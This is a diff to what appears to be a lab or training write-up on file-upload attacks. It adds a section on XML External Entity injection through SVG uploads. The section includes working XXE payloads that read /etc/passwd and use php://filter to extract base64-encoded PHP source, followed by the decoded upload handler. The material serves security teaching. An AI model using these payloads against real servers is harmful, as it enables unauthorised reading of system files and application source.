@@ -803,9 +803,11 @@ All upload defenses were successfully bypassed, resulting in remote code executi
 
 ## Limited File Uploads
 
-So far we have been dealing with vulnerable filters related to **arbitrary file uploads**. Some upload forms have secure filters that only allow us to upload specific file types (limited file uploads). These filters may not be bypassed with the techniques discussed thus far. However, some types of attacks may still be possible.
+So far, we have focused on vulnerabilities that allow `arbitrary file uploads`, typically due to weak or flawed validation mechanisms. In some cases, however, upload functionality is more securely implemented and only permits a restricted set of file types. These scenarios are commonly referred to as `limited file uploads`.
 
-Certain file types, such as `SVG`, `HTML` and `XML` may allow us to upload malicious files. This is why fuzzing for allowed file extensions is a crucial part of all file upload attacks. Knowing that file extensions are accepted, enables us to determine what type of attacks may be achievable. 
+While limited file uploads may not be bypassable using the techniques discussed earlier (e.g., extension manipulation or content-type spoofing), they can still introduce security risks. Even when executable file types are blocked, certain **non-executable formats** may still be abused to achieve impactful attacks. 
+
+File types such as `SVG`, `HTML`, and `XML` can often be leveraged for client-side attacks, including **stored Cross-Site Scripting (XSS)**, **CSRF**, or **data exfiltration**. As a result, **fuzzing for allowed file extensions** remains a critical step in any file upload assessment. Identifying which file types are accepted enables us to determine the potential attack surface and pivot toward alternative exploitation techniques when direct code execution is not possible.
 
 ### Cross-Site Scripting (XSS)
 
@@ -867,3 +869,98 @@ Once uploaded, the JavaScript payload executes whenever the SVG is rendered by t
 ---
 
 ### XML External Entity (XXE) Injection
+
+XXE injection is another attack vector that may be possible in **limited file upload scenarios**, particularly when the application accepts and processes **XML-based file formats** such as `SVG`.
+
+If user-supplied XML is parsed by the server without proper hardening, an attacker may be able to define external entities that reference local or remote resources. This can lead to **local file inclusion (LFI)**, sensitive data disclosure, or even server-side request forgery (SSRF).
+
+The following example demonstrates an XXE payload embedded inside an `SVG` file. The payload defines an external entity that reads the `/etc/passwd` file using the `file://` scheme:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+![Filtered output](images/xxe.PNG)
+
+When the file is processed and rendered, the contents of `/etc/passwd` are included in the output. **By inspecting the page source**, we can clearly observe the file contents:
+
+![Filtered output](images/xxe2.PNG)
+
+In PHP-based environments, XXE vulnerabilities can often be escalated by leveraging **PHP stream wrappers**. One particularly useful wrapper is `php://filter`, which allows us to transform file contents before they are returned.
+
+The following payload uses the `convert.base64-encode` filter to extract the source code of `index.php`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+![Filtered output](images/xxe3.PNG)
+
+Inspecting the page source reveals a Base64-encoded version of the file:
+
+![Filtered output](images/xxe4.PNG)
+
+We can decode the output locally to recover the source code:
+
+```bash
+echo "<base64 string>" | base64 -d
+```
+
+![Filtered output](images/xxe5.PNG)
+
+Applying the same technique to `upload.php` reveals critical implementation details, including:
+
+- The upload directory (`./images/`)
+- File extension validation
+- Content-Type and MIME-type enforcement
+- File size restrictions
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
+
+Decoded source code:
+
+```php
+<?php
+$target_dir = "./images/";
+$fileName = basename($_FILES["uploadFile"]["name"]);
+$target_file = $target_dir . $fileName;
+$contentType = $_FILES['uploadFile']['type'];
+$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+if (!preg_match('/^.*\.svg$/', $fileName)) {
+    echo "Only SVG images are allowed";
+    die();
+}
+
+foreach (array($contentType, $MIMEtype) as $type) {
+    if (!in_array($type, array('image/svg+xml'))) {
+        echo "Only SVG images are allowed";
+        die();
+    }
+}
+
+if ($_FILES["uploadFile"]["size"] > 500000) {
+    echo "File too large";
+    die();
+}
+
+if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
+    $latest = fopen($target_dir . "latest.xml", "w");
+    fwrite($latest, basename($_FILES["uploadFile"]["name"]));
+    fclose($latest);
+    echo "File successfully uploaded";
+} else {
+    echo "File failed to upload";
+}
+```
+
+This confirms that, despite strict filtering, the application is still vulnerable to XXE due to unsafe XML parsing.
+
